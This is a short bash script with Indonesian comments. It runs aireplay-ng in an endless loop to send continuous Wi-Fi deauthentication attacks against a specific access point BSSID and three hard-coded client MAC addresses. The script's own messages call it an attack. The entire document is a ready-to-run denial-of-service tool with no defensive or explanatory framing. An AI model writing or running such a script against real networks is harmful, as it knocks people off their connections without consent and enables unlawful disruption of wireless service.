#!/bin/bash

INTERFACE="wlp3s0"
BSSID="24:46:E4:1E:F5:7C"  # Ganti dengan BSSID target
DEAUTH_COUNT=0  # 0 = terus-menerus

# Daftar klien (STATION MAC)
CLIENTS=(
    "56:46:9D:42:09:46"
    "04:E5:98:17:64:87"
    "6A:B1:E1:D5:77:A5"
)

echo "[*] Mulai serangan deauth ke ${#CLIENTS[@]} klien..."

while true; do
    for CLIENT in "${CLIENTS[@]}"; do
        echo ">> Menyerang $CLIENT"
        sudo aireplay-ng --deauth $DEAUTH_COUNT -a $BSSID -c $CLIENT $INTERFACE --ignore-negative-one
        sleep 1
    done
done

